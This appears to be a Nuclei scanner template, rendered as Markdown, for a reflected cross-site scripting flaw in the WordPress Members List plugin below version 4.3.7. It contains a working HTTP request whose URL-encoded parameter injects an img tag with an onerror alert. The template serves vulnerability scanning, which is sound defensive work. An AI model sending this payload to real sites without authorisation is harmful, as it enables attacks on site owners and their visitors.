# Nuclei Template: WordPress Members List <4.3.7 - Cross-Site Scripting
**Template ID:** members-list-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`members-list-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Members List 4.3.7 does not sanitize and escape some parameters in various pages before outputting them back, leading to reflected cross-site scripting vulnerabilities.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x
```

## References
- https://wpscan.com/vulnerability/d13f26f0-5d91-49d7-b514-1577d4247648
